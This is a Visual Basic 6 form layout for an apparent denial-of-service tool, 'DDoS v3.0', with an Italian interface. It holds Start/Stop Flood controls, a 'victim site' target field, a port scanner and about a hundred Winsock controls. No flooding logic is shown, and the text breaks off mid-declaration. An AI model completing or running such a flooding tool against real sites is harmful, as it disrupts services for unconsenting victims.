VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "Mswinsck.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MsComCtl.ocx"
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.ocx"
Object = "{2A6D8023-0587-4248-B0CB-11006E6C640B}#4.1#0"; "CoolXPButton.ocx"
Object = "{DA729E34-689F-49EA-A856-B57046630B73}#1.0#0"; "Progressbar-xp.ocx"
Begin VB.Form Form1 
   BackColor       =   &H00080808&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "DDoS v3.0 By xXManuddXx"
   ClientHeight    =   10200
   ClientLeft      =   4935
   ClientTop       =   1110
   ClientWidth     =   8445
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   10200
   ScaleWidth      =   8445
   Begin MSWinsockLib.Winsock WinsockPacket 
      Left            =   7800
      Top             =   7440
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock WinsockResolve 
      Left            =   3600
      Top             =   9840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin CoolXPButton.xpButton xpButton14 
      Height          =   375
      Left            =   6120
      TabIndex        =   51
      Top             =   7920
      Width           =   2055
      _ExtentX        =   3625
      _ExtentY        =   661
      Caption         =   "Svuota"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      CornerColor     =   -2147483633
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Timer Timer5 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   5760
      Top             =   9840
   End
   Begin VB.Timer Timer4 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   5040
      Top             =   9840
   End
   Begin Proyecto2.XP_ProgressBar ProgressBar1 
      Height          =   495
      Left            =   120
      TabIndex        =   48
      Top             =   9360
      Width           =   8175
      _ExtentX        =   14420
      _ExtentY        =   873
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BrushStyle      =   0
      Color           =   65280
      Scrolling       =   9
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   7800
      Top             =   9480
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin CoolXPButton.xpButton xpButton13 
      Height          =   375
      Left            =   3000
      TabIndex        =   47
      Top             =   7920
      Width           =   2775
      _ExtentX        =   4895
      _ExtentY        =   661
      Caption         =   "Visualizza Html Sito"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      CornerColor     =   -2147483633
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.TextBox TextSec 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   6840
      TabIndex        =   46
      Text            =   "1000"
      Top             =   4920
      Width           =   735
   End
   Begin VB.Timer TimerPING 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   7440
      Top             =   5280
   End
   Begin VB.Timer TimerCheck 
      Interval        =   100
      Left            =   240
      Top             =   3960
   End
   Begin VB.TextBox Text8 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   735
      HideSelection   =   0   'False
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   41
      Text            =   "Form1.frx":4C4A
      Top             =   8520
      Width           =   8175
   End
   Begin MSWinsockLib.Winsock WinsockUDP 
      Left            =   7440
      Top             =   9360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock106 
      Left            =   7920
      Top             =   8880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock WinsockScanner 
      Left            =   7440
      Top             =   8880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer TimerICMP 
      Enabled         =   0   'False
      Interval        =   1000
      Left            =   6960
      Top             =   8880
   End
   Begin MSWinsockLib.Winsock Winsock101 
      Left            =   11880
      Top             =   7200
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock100 
      Left            =   13800
      Top             =   6720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock99 
      Left            =   13200
      Top             =   6720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock98 
      Left            =   12480
      Top             =   6720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock97 
      Left            =   11760
      Top             =   6720
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Timer Timer3 
      Enabled         =   0   'False
      Interval        =   600
      Left            =   6960
      Top             =   8400
   End
   Begin CoolXPButton.xpButton xpButton12 
      Height          =   375
      Left            =   360
      TabIndex        =   40
      Top             =   7920
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   661
      Caption         =   "Visualizza Sito"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      CornerColor     =   -2147483633
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Frame Frame2 
      BackColor       =   &H00000000&
      Caption         =   "Port Scanner"
      ForeColor       =   &H0000FF00&
      Height          =   1095
      Left            =   120
      TabIndex        =   28
      Top             =   6240
      Width           =   8175
      Begin MSComctlLib.ProgressBar PB1 
         Height          =   255
         Left            =   2640
         TabIndex        =   45
         Top             =   240
         Width           =   1095
         _ExtentX        =   1931
         _ExtentY        =   450
         _Version        =   393216
         Appearance      =   1
      End
      Begin VB.Timer TimerPort 
         Enabled         =   0   'False
         Interval        =   270
         Left            =   3000
         Top             =   240
      End
      Begin CoolXPButton.xpButton xpButton10 
         Height          =   255
         Left            =   1680
         TabIndex        =   35
         Top             =   720
         Width           =   1575
         _ExtentX        =   2778
         _ExtentY        =   450
         Caption         =   "Stop"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         CornerColor     =   -2147483633
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton9 
         Height          =   255
         Left            =   120
         TabIndex        =   34
         Top             =   720
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         Caption         =   "Start"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         CornerColor     =   -2147483633
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox Text7 
         BackColor       =   &H00000000&
         ForeColor       =   &H0000FF00&
         Height          =   285
         Left            =   1440
         TabIndex        =   33
         Text            =   "500"
         Top             =   240
         Width           =   1095
      End
      Begin CoolXPButton.xpButton xpButton8 
         Height          =   255
         Left            =   3960
         TabIndex        =   32
         Top             =   600
         Width           =   1215
         _ExtentX        =   2143
         _ExtentY        =   450
         Caption         =   "Reset"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         CornerColor     =   -2147483633
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.ListBox List1 
         BackColor       =   &H80000008&
         ForeColor       =   &H0000FF00&
         Height          =   645
         Left            =   5400
         TabIndex        =   30
         Top             =   240
         Width           =   2655
      End
      Begin VB.TextBox Text6 
         BackColor       =   &H00000000&
         ForeColor       =   &H0000FF00&
         Height          =   285
         Left            =   120
         TabIndex        =   29
         Text            =   "0"
         Top             =   240
         Width           =   975
      End
      Begin VB.Label Label2 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         Caption         =   "Porte Aperte ----->"
         ForeColor       =   &H0000FF00&
         Height          =   195
         Left            =   3960
         TabIndex        =   31
         Top             =   240
         Width           =   1245
      End
   End
   Begin CoolXPButton.xpButton xpButton7 
      Height          =   375
      Left            =   2640
      TabIndex        =   24
      Top             =   5760
      Width           =   1935
      _ExtentX        =   3413
      _ExtentY        =   661
      Caption         =   "Stop"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      CornerColor     =   -2147483633
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin CoolXPButton.xpButton xpButton6 
      Height          =   375
      Left            =   120
      TabIndex        =   23
      Top             =   5760
      Width           =   2295
      _ExtentX        =   4048
      _ExtentY        =   661
      Caption         =   "Start"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      CornerColor     =   -2147483633
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   7440
      Top             =   8400
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Set"
      Height          =   255
      Left            =   7680
      TabIndex        =   21
      Top             =   4920
      Width           =   615
   End
   Begin VB.CheckBox Check1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      Caption         =   "Apri PIng Ogni M/s"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   5040
      MaskColor       =   &H00000000&
      TabIndex        =   20
      Top             =   4920
      Width           =   1695
   End
   Begin VB.CommandButton Command1 
      BackColor       =   &H0000FF00&
      Caption         =   "Ping"
      Height          =   255
      Left            =   4080
      MaskColor       =   &H00000000&
      TabIndex        =   19
      Top             =   4920
      Width           =   855
   End
   Begin VB.TextBox Text5 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   2520
      TabIndex        =   18
      Text            =   "2000"
      Top             =   4920
      Width           =   1215
   End
   Begin VB.TextBox Text3 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   600
      TabIndex        =   15
      Text            =   "500"
      Top             =   4920
      Width           =   975
   End
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   7920
      Top             =   8400
   End
   Begin CoolXPButton.xpButton xpButton5 
      Height          =   375
      Left            =   6360
      TabIndex        =   12
      Top             =   3960
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "Stop Flood"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      CornerColor     =   -2147483633
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin CoolXPButton.xpButton xpButton4 
      Height          =   375
      Left            =   4680
      TabIndex        =   11
      Top             =   3960
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   661
      Caption         =   "Start Flood"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      CornerColor     =   -2147483633
      BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.Frame Frame1 
      BackColor       =   &H00000000&
      Caption         =   "Opzioni Sito"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   11.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H0000FF00&
      Height          =   1455
      Left            =   120
      TabIndex        =   7
      Top             =   600
      Width           =   8175
      Begin CoolXPButton.xpButton xpButton3 
         Height          =   375
         Left            =   5760
         TabIndex        =   43
         Top             =   840
         Width           =   1935
         _ExtentX        =   3413
         _ExtentY        =   661
         Caption         =   "Trova IP"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         CornerColor     =   -2147483633
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox Text9 
         BackColor       =   &H00000000&
         ForeColor       =   &H0000FF00&
         Height          =   285
         Left            =   5640
         TabIndex        =   42
         Text            =   "Idle"
         Top             =   360
         Width           =   2295
      End
      Begin CoolXPButton.xpButton xpButton2 
         Height          =   375
         Left            =   2880
         TabIndex        =   10
         Top             =   840
         Width           =   2535
         _ExtentX        =   4471
         _ExtentY        =   661
         Caption         =   "Stop"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         CornerColor     =   -2147483633
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin CoolXPButton.xpButton xpButton1 
         Height          =   375
         Left            =   240
         TabIndex        =   9
         Top             =   840
         Width           =   2415
         _ExtentX        =   4260
         _ExtentY        =   661
         Caption         =   "Start"
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         BeginProperty FontOnMouseOver {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         CornerColor     =   -2147483633
         BeginProperty FontDown {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
      End
      Begin VB.TextBox Text1 
         BackColor       =   &H00000000&
         ForeColor       =   &H0000FF00&
         Height          =   285
         Left            =   240
         TabIndex        =   8
         Text            =   "Sitovittima.com / IP"
         Top             =   360
         Width           =   5175
      End
   End
   Begin MSComctlLib.Slider SD2 
      Height          =   375
      Left            =   4440
      TabIndex        =   6
      Top             =   3360
      Width           =   3255
      _ExtentX        =   5741
      _ExtentY        =   661
      _Version        =   393216
      LargeChange     =   9
   End
   Begin VB.TextBox Text4 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   4560
      TabIndex        =   5
      Text            =   "80"
      Top             =   2640
      Width           =   3135
   End
   Begin MSComctlLib.Slider SD 
      Height          =   375
      Left            =   360
      TabIndex        =   1
      Top             =   3360
      Width           =   3375
      _ExtentX        =   5953
      _ExtentY        =   661
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock64 
      Left            =   11880
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock63 
      Left            =   11880
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock62 
      Left            =   11880
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock61 
      Left            =   11880
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H0000FF00&
      Height          =   285
      Left            =   360
      TabIndex        =   0
      Text            =   "80"
      Top             =   2640
      Width           =   3375
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   8520
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   9000
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock3 
      Left            =   9480
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock4 
      Left            =   9960
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock5 
      Left            =   8520
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock6 
      Left            =   9000
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock7 
      Left            =   9480
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock8 
      Left            =   9960
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock9 
      Left            =   8520
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock10 
      Left            =   9000
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock11 
      Left            =   9480
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock12 
      Left            =   9960
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock13 
      Left            =   8520
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock14 
      Left            =   9000
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock15 
      Left            =   9480
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock16 
      Left            =   8520
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock17 
      Left            =   9000
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock18 
      Left            =   9480
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock19 
      Left            =   9960
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock20 
      Left            =   8520
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock21 
      Left            =   9000
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock22 
      Left            =   9480
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock23 
      Left            =   9960
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock24 
      Left            =   8520
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock25 
      Left            =   9000
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock26 
      Left            =   9480
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock27 
      Left            =   9960
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock28 
      Left            =   8520
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock29 
      Left            =   9000
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock30 
      Left            =   9480
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock31 
      Left            =   10440
      Top             =   4800
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock32 
      Left            =   11400
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock33 
      Left            =   10920
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock34 
      Left            =   10440
      Top             =   4320
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock35 
      Left            =   11400
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock36 
      Left            =   11880
      Top             =   5760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock37 
      Left            =   9960
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock38 
      Left            =   10440
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock39 
      Left            =   10920
      Top             =   6240
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock40 
      Left            =   10920
      Top             =   5280
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock41 
      Left            =   10440
      Top             =   3360
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock42 
      Left            =   10440
      Top             =   2880
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin MSWinsockLib.Winsock Winsock43 
      Left            =   11400
      Top             =   3840
